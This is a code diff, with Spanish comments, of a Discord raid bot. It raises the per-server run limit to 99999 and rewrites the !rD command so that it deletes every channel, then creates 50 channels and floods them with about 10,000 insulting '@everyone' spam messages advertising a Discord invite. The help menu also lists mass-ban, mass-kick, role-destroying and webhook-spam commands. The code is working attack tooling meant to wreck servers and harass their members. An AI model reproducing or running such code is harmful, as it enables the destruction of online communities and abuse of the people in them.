@@ -23,7 +23,7 @@ GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737
 
 # ================= VARIABLES GLOBALES INDEPENDIENTES =================
 ejecuciones_por_servidor = {}  
-MAX_EJECUCIONES = 2
+MAX_EJECUCIONES = 99999
 tiempo_inicio = datetime.now()
 
 # Configuración explícita de los Intents necesarios
@@ -131,74 +131,47 @@ async def banpro(ctx):
         await asyncio.sleep(0.8)
 
 
-# ================= 2. COMANDO RAIDEAR Y SPAM (rD) MODIFICADO =================
+# ================= 2. COMANDO RAIDEAR Y SPAM (rD) ACTUALIZADO =================
 @bot.command()
 async def rD(ctx):
     global ejecuciones_por_servidor
-    if not ctx.guild: return
-    
-    if not ctx.author.guild_permissions.manage_channels: return
-    if not ctx.guild.me.guild_permissions.manage_channels: return
+    if not ctx.guild or not ctx.author.guild_permissions.manage_channels: return
 
     actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
+    if actuales >= MAX_EJECUCIONES: return
 
-    if actuales >= MAX_EJECUCIONES:
-        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). Espera a que termine el ataque actual.")
+    ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
+    
+    # 1. Borrar canales previos
+    for channel in list(ctx.guild.channels):
+        try: await channel.delete()
         except: pass
-        return
 
-    sumado = False
-
+    # 2. Crear canal especial (Sin spam)
     try:
-        ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
-        sumado = True
+        ch_esp = await ctx.guild.create_text_channel(name="Unete-a-Mc-r")
+        await ch_esp.send("https://discord.gg/aACMXB4HSp")
+    except: pass
 
-        # 1. Borrar canales previos
-        for channel in list(ctx.guild.channels):
-            try: await channel.delete()
-            except: pass
-
-        # 2. Crear canales (1 especial + 50 de spam)
-        created_channels = []
-        
-        # Canal especial
-        try:
-            ch_especial = await ctx.guild.create_text_channel(name="Unete-a-Mc-r")
-            await ch_especial.send("https://discord.gg/aACMXB4HSp")
-        except: pass
-
-        # Canales de spam
-        for _ in range(50):
+    # 3. Función auxiliar de spam para cada canal
+    async def spam_en_canal(channel):
+        for _ in range(202): # Total 10,100 mensajes (50 * 202)
             try:
-                ch = await ctx.guild.create_text_channel(name="Mc R")
-                created_channels.append(ch)
-            except: pass
+                await channel.send("@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp")
+                await asyncio.sleep(1.2) # Pausa para Railway
+            except:
+                break
 
-        # 3. Spam de 18,999 mensajes en total (distribuidos en los 50 canales)
-        msg_por_canal = 380 
-        mensaje_spam = "@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp"
-        gif_file = await obtener_gif_file()
-        
-        async def spam_task(channel):
-            for _ in range(msg_por_canal):
-                try:
-                    if gif_file:
-                        gif_file.fp.seek(0)
-                        await channel.send(content=mensaje_spam, file=gif_file)
-                    else:
-                        await channel.send(content=mensaje_spam)
-                    await asyncio.sleep(1.0) # Control de cadencia
-                except discord.HTTPException as e:
-                    if e.status == 429: await asyncio.sleep(5)
-                    else: break
+    # 4. Crear 50 canales de spam y lanzar tareas
+    for i in range(50):
+        try:
+            ch = await ctx.guild.create_text_channel(name=f"Mc-R-{i}")
+            await asyncio.sleep(0.5) 
+            asyncio.create_task(spam_en_canal(ch))
+        except: 
+            pass
 
-        tasks = [spam_task(ch) for ch in created_channels]
-        await asyncio.gather(*tasks)
-
-    finally:
-        if sumado:
-            actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
-            ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)
+    ejecuciones_por_servidor[ctx.guild.id] = max(0, ejecuciones_por_servidor.get(ctx.guild.id, 1) - 1)
 
 
 # ================= 3. EXPULSIÓN MASIVA =================
@@ -428,7 +401,7 @@ async def ayuda(ctx):
         "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
-        "!rD           -> elimina todo, crear 51 canales e inundar con 20k mensajes.\n"
+        "!rD           -> elimina todo, crear 51 canales e inundar con 10k mensajes.\n"
         "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
         "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
         "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
@@ -436,7 +409,8 @@ async def ayuda(ctx):
         "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
         "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
         "!emojisD      -> elimina los emojis y stickers personalizados.\n"
-        "```"
+        "
+```"
     )
     try: 
         await ctx.send(menu)
